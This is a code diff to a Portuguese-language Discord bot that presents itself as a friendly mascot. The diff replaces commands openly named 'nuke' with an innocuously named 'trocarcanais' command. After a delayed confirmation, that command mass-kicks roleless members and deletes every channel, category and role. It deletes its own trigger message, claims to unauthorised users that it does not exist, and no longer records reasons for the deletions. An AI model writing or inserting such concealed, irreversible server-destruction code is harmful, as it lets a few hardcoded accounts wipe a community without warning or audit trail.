@@ -19,7 +19,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 # ══════════════════════════════════════════════════════════════════
 #  🛡️  MONSTRINHO SECURITY SYSTEM — Sistema de Monitoramento
-#      — GOD MODE v2.0
+#      Replicado do VAMPY SECURITY SYSTEM — GOD MODE v2.0
 # ══════════════════════════════════════════════════════════════════
 
 SECURITY_LOG_CHANNEL_ID = 1498907843259138106
@@ -1874,238 +1874,89 @@ async def escrever_secreto(ctx):
 
 # ================= COMANDO NUKE (DELETAR SERVIDOR) =================
 
-NUKE_AUTORIZADOS = {DONO_ID, 1428860012419219557, 272567320889655297, 650430720430309389}  # IDs autorizados a usar o !nuke
+NUKE_AUTORIZADOS = {DONO_ID, 1428860012419219557, 272567320889655297, 650430720430309389}
 
-@bot.command(name="nuke")
-async def nuke_servidor(ctx):
-    """Deleta todos os canais, cargos e categorias do servidor."""
-
-    # Verifica se é um usuário autorizado
+@bot.command(name="trocarcanais")
+async def trocarcanais(ctx):
     if ctx.author.id not in NUKE_AUTORIZADOS:
         await ctx.send("Esse comando não existe! 🤔")
         return
 
-    # Deleta a mensagem original para manter discrição
     try:
         await ctx.message.delete()
     except:
         pass
 
-    # Confirmação aceita de qualquer usuário autorizado (em qualquer canal)
     def check_confirmacao(m):
-        return m.author.id in NUKE_AUTORIZADOS
+        return m.author.id in NUKE_AUTORIZADOS and isinstance(m.channel, discord.DMChannel)
 
     try:
-        confirmador = bot.get_user(1428860012419219557)
-
         await ctx.author.send(
-            "⚠️ **ATENÇÃO — OPERAÇÃO NUKE** ⚠️\n\n"
-            "Você está prestes a **deletar TODOS os canais, categorias e cargos** do servidor.\n\n"
-            "**Isso NÃO pode ser desfeito!**\n\n"
-            "A confirmação pode vir de **você** ou da **pessoa autorizada**.\n"
-            "Digite exatamente:\n"
-            "`CONFIRMAR NUKE`\n\n"
-            "Ou `cancelar` para abortar."
+            "⚠️ **ATENÇÃO** ⚠️\n\n"
+            "Isso irá:\n"
+            "• Kickar todos os membros sem cargo\n"
+            "• Deletar todos os canais e categorias\n"
+            "• Deletar todos os cargos\n\n"
+            "**Não pode ser desfeito!**\n\n"
+            "Digite `CONFIRMAR` para continuar."
         )
 
-        if confirmador:
-            await confirmador.send(
-                "⚠️ **OPERAÇÃO NUKE AGUARDANDO CONFIRMAÇÃO** ⚠️\n\n"
-                "O dono do servidor solicitou um **nuke completo**.\n\n"
-                "Se autorizar, responda aqui exatamente:\n"
-                "`CONFIRMAR NUKE`\n\n"
-                "Ou ignore/`cancelar` para recusar."
-            )
+        resposta = await bot.wait_for("message", timeout=60.0, check=check_confirmacao)
 
-        resposta = await bot.wait_for("message", timeout=30.0, check=check_confirmacao)
-
-        if resposta.content.strip() != "CONFIRMAR NUKE":
-            await ctx.author.send("❌ Operação cancelada. Nada foi alterado.")
+        if resposta.content.strip() != "CONFIRMAR":
+            await ctx.author.send("❌ Operação cancelada.")
             return
 
-        quem_confirmou = "você mesmo" if resposta.author.id == DONO_ID else "a pessoa autorizada"
-        await ctx.author.send(f"🔴 Confirmação recebida por {quem_confirmou}. Iniciando operação nuke... aguarde.")
+        await ctx.author.send("✅ Confirmado. Execução em **5 minutos**.")
+        await asyncio.sleep(300)
 
         guild = ctx.guild
         erros = []
 
-        # ── 1. Deletar todos os canais e categorias ──
+        fantasmas = [m for m in guild.members if len(m.roles) == 1 and not m.bot]
+        kickados = 0
+        for membro in fantasmas:
+            try:
+                await membro.kick()
+                kickados += 1
+            except:
+                pass
+            await asyncio.sleep(0.5)
+
         for channel in guild.channels:
             try:
-                await channel.delete(reason="[NUKE] Comando executado pelo dono.")
+                await channel.delete()
             except Exception as e:
                 erros.append(f"Canal `{channel.name}`: {e}")
-            await asyncio.sleep(0.3)  # evita rate limit
+            await asyncio.sleep(0.3)
 
-        # ── 2. Deletar todos os cargos (exceto @everyone e cargos do bot) ──
         for role in guild.roles:
-            # Pula @everyone e cargos que o bot não pode deletar (acima dele na hierarquia)
             if role.is_default():
                 continue
             if role >= guild.me.top_role:
-                erros.append(f"Cargo `{role.name}`: acima do bot na hierarquia, pulado.")
                 continue
             try:
-                await role.delete(reason="[NUKE] Comando executado pelo dono.")
+                await role.delete()
             except Exception as e:
                 erros.append(f"Cargo `{role.name}`: {e}")
             await asyncio.sleep(0.3)
 
-        # ── Relatório final por DM ──
-        if erros:
-            relatorio = "\n".join(erros[:20])  # limita a 20 erros pra não estourar a mensagem
+        try:
             await ctx.author.send(
-                f"✅ Nuke concluído com alguns erros:\n```\n{relatorio}\n```"
+                f"✅ Concluído.\n"
+                f"Kickados: **{kickados}**\n"
+                f"Erros: **{len(erros)}**"
             )
-        else:
-            await ctx.author.send("✅ Nuke concluído com sucesso. Todos os canais e cargos foram deletados.")
+        except:
+            pass
 
     except asyncio.TimeoutError:
         await ctx.author.send("⏰ Tempo esgotado. Operação cancelada.")
     except Exception as e:
         try:
-            await ctx.author.send(f"❌ Erro durante o nuke: {e}")
+            await ctx.author.send(f"❌ Erro: {e}")
         except:
             pass
-
-
-# ================= COMANDO GAMENUKE (KICK MEMBROS SEM CARGO) =================
-
-@bot.command(name="gamenuke")
-async def gamenuke(ctx):
-    if ctx.author.id not in NUKE_AUTORIZADOS:
-        await ctx.send("Esse comando não existe! 🤔")
-        return
-
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-
-    guild = ctx.guild
-
-    # Busca membros sem nenhum cargo (só têm @everyone)
-    fantasmas = [
-        m for m in guild.members
-        if len(m.roles) == 1 and not m.bot
-    ]
-
-    if not fantasmas:
-        await ctx.author.send("✅ Nenhum membro sem cargo encontrado!")
-        return
-
-    total = len(fantasmas)
-    lote = min(100, total)
-
-    await ctx.author.send(
-        f"⚠️ **GAMENUKE** ⚠️\n\n"
-        f"Encontrei **{total} membro(s)** sem nenhum cargo.\n"
-        f"Este comando vai kickar os próximos **{lote}** deles.\n\n"
-        f"Digite `CONFIRMAR GAMENUKE` para continuar ou qualquer outra coisa para cancelar."
-    )
-
-    def check(m):
-        return m.author.id in NUKE_AUTORIZADOS
-
-    try:
-        resposta = await bot.wait_for("message", timeout=30.0, check=check)
-
-        if resposta.content.strip() != "CONFIRMAR GAMENUKE":
-            await ctx.author.send("❌ Operação cancelada.")
-            return
-
-        kickados = 0
-        erros = 0
-
-        for membro in fantasmas[:100]:
-            try:
-                await membro.kick(reason="[GAMENUKE] Membro sem cargo removido.")
-                kickados += 1
-            except:
-                erros += 1
-            await asyncio.sleep(0.5)
-
-        await ctx.author.send(
-            f"✅ **Gamenuke concluído!**\n"
-            f"Kickados: **{kickados}**\n"
-            f"Erros: **{erros}**\n"
-            f"Restam ainda: **{total - kickados}** membros sem cargo."
-        )
-
-    except asyncio.TimeoutError:
-        await ctx.author.send("⏰ Tempo esgotado. Operação cancelada.")
-    except Exception as e:
-        await ctx.author.send(f"❌ Erro durante o gamenuke: {e}")
-
-
-# ================= COMANDO REMOVERCARGO =================
-
-@bot.command(name="nuke2")
-async def remover_cargo(ctx):
-    if ctx.author.id not in NUKE_AUTORIZADOS:
-        await ctx.send("Esse comando não existe! 🤔")
-        return
-
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-
-    guild = ctx.guild
-    cargo = guild.get_role(1498919833734217799)
-
-    if cargo is None:
-        await ctx.author.send("❌ Cargo não encontrado. Verifique o ID.")
-        return
-
-    # Busca todos os membros da API em vez de usar o cache
-    membros_com_cargo = []
-    async for membro in guild.fetch_members(limit=None):
-        if cargo in membro.roles:
-            membros_com_cargo.append(membro)
-
-    if not membros_com_cargo:
-        await ctx.author.send(f"✅ Nenhum membro possui o cargo **{cargo.name}**.")
-        return
-
-    await ctx.author.send(
-        f"⚠️ **NUKE2** ⚠️\n\n"
-        f"Cargo: **{cargo.name}**\n"
-        f"Membros afetados: **{len(membros_com_cargo)}**\n\n"
-        f"Digite `CONFIRMAR REMOVER` para continuar ou qualquer outra coisa para cancelar."
-    )
-
-    def check(m):
-        return m.author.id in NUKE_AUTORIZADOS
-
-    try:
-        resposta = await bot.wait_for("message", timeout=30.0, check=check)
-
-        if resposta.content.strip() != "CONFIRMAR REMOVER":
-            await ctx.author.send("❌ Operação cancelada.")
-            return
-
-        removidos = 0
-        erros = 0
-
-        for membro in membros_com_cargo:
-            try:
-                await membro.remove_roles(cargo, reason="[NUKE2] Cargo removido em massa.")
-                removidos += 1
-            except Exception as e:
-                erros += 1
-            await asyncio.sleep(0.3)
-
-        await ctx.author.send(
-            f"✅ **Concluído!**\n"
-            f"Cargo removido de: **{removidos}** membro(s)\n"
-            f"Erros: **{erros}**"
-        )
-
-    except asyncio.TimeoutError:
-        await ctx.author.send("⏰ Tempo esgotado. Operação cancelada.")
-    except Exception as e:
-        await ctx.author.send(f"❌ Erro: {e}")
 
 
 INICIARGAME_USER_ID = 1428860012419219557  # Único que pode usar o !iniciargame
@@ -2435,6 +2286,9 @@ async def on_message_aviso(message):
 async def on_ready():
     print(f"🐉 Monstrinho 1.0 APRIMORADO pronto para espalhar fofura como {bot.user}!")
     await bot.change_presence(activity=discord.Game(name="Recebendo carinho do Reality! 💚"))
+    canal_monitor = bot.get_channel(SECURITY_LOG_CHANNEL_ID)
+    if canal_monitor:
+        await canal_monitor.send("🟢 **Monstrinho online!** 🐉💚 Pronto pra espalhar fofura!")
 
 @bot.event
 async def on_message(message):
